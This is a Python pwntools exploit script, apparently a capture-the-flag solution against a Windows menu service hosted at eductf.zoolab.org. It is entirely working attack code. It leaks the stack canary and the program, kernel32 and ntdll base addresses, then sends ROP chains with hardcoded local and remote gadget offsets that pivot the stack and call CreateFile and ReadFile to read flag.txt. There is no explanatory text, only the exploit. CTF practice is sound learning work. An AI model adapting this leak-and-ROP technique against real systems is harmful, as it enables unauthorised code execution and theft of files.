from pwn import *
import time
import sys


def add(ind, data):
    assert len(data) <= 0x100
    proc.sendlineafter(b':', b'1')
    proc.sendlineafter(b':', f'{ind}'.encode())
    proc.sendafter(b':', data)


def show(ind):
    proc.sendlineafter(b':', b'2')
    proc.sendlineafter(b':', f'{ind}'.encode())
    return proc.recvuntil(b'*********')


def exploit():
    for i in range(5):
        proc.sendlineafter(b':', b'1')
        proc.sendafter(b':', b'A' * 0x100)
    add(5, b'B' * 8)
    leak = show(5).replace(b'\r\n', b'\n')
    print(leak)
    canary = leak[0x50:0x58]
    print(canary)
    canary = u64(canary)
    prog_base = leak[0x60:0x68]
    print(prog_base)
    prog_base = u64(prog_base)
    prog_base -= 0x1734
    kernel32 = leak[0xa0:0xa8]
    print(kernel32)
    kernel32 = u64(kernel32)
    ntdll = leak[0xd0:0xd8]
    print(ntdll)
    ntdll = u64(ntdll)
    if len(sys.argv) <= 1:
        # local
        ntdll -= 0x6a271
        kernel32 -= 0x17974
        # local
        pop_rax = kernel32 + 0x63b6
        leave_and_ac_ret = kernel32 + 0x5a49d
        jmp_ptr_rbx = kernel32 + 0x36035
        pop_rcx = ntdll + 0x9217b
        pop_rdx_r11 = ntdll + 0x8fb37
        pop_r89ab = ntdll + 0x8fb32
        xchg_eax_ecx = ntdll + 0x228ef
        getstdhandle = kernel32 + 0x1c890
        readfile = kernel32 + 0x22680
        pop_rsp = ntdll + 0x30f2
        createfile = kernel32 + 0x222F0
    else:
        # remote
        ntdll -= 0x6ced1
        kernel32 -= 0x17bd4
        # remote
        pop_rax = kernel32 + 0x6e76
        leave_and_ac_ret = kernel32 + 0x59dfd
        jmp_ptr_rbx = kernel32 + 0x3920b
        pop_rcx = ntdll + 0x21597
        pop_rdx_r11 = ntdll + 0x8c4b7
        pop_r89ab = ntdll + 0x8c4b2
        xchg_eax_ecx = ntdll + 0x87ebb
        getstdhandle = kernel32 + 0x1c610
        readfile = kernel32 + 0x22410
        pop_rsp = ntdll + 0xb416
        createfile = kernel32 + 0x22080

    log.info('canary: ' + hex(canary))
    log.info('prog_base: ' + hex(prog_base))
    log.info('kernel32: ' + hex(kernel32))
    log.info('ntdll: ' + hex(ntdll))

    pop_rsp_addrsp_0x20_pop_rdi = prog_base + 0x1ec7
    puts_menu = prog_base + 0x11bc
    main = prog_base + 0x1070
    pop_rbx = prog_base + 0x1063
    puts_iat = prog_base + 0x31b0
    exit = prog_base + 0x14a4
    index_str = prog_base + 0x328c
    write_iat = prog_base + 0x3190
    stack = ntdll + 0x15f000 + 0x4000

    read_menu = prog_base + 0x1337
    getstdhandle_iat = prog_base + 0x3008
    # buf = b'B' * 0x50 , canary, rbp, ret
    buf = flat(b'B' * 0x50, canary, stack - 0x480, pop_rcx, 0xfffffff6,
            getstdhandle, xchg_eax_ecx,
            pop_r89ab, 0x600, stack - 8, 0, 0, pop_rdx_r11, stack, 0,
            pop_rbx, 0, readfile, pop_rsp, stack + 0x100)
    add(5, buf)
    input('a')
    proc.sendlineafter(b':', b'3')
    input('wait')

    if len(sys.argv) <= 1:
        # local
        add_rsp38 = ntdll + 0x2a3b
    else:
        # remote
        add_rsp38 = ntdll + 0x26fb
    createfileflag = 0x80 | 0x40000000
    createfileflag = 1
    buf = flat(b'flag.txt'.ljust(0x100, b'\x00'), pop_rcx, stack,
            pop_rdx_r11, 0x80000000, 0, pop_r89ab, 1, 0, 0, 0,
            createfile, add_rsp38, 0, 0, 0, 0, 3, createfileflag, 0,
            xchg_eax_ecx, pop_rdx_r11, stack, 0, pop_r89ab, 0x20, stack - 8,
            0x41, 0x41, readfile, add_rsp38, 0x41, 0x41, 0x41, 0x41, 0, 0x41, 0x41,
            pop_rcx, stack, puts_menu)
    proc.sendline(buf)


if __name__ == '__main__':
    context.arch = 'amd64'
    if len(sys.argv) > 1:
        connect = 'nc eductf.zoolab.org 30001'
        connect = connect.split(' ')
        proc = remote(connect[1], int(connect[2]))
    else:
        connect = 'nc 192.168.9.1 30001'
        connect = connect.split(' ')
        proc = remote(connect[1], int(connect[2]))
    exploit()
    proc.interactive()
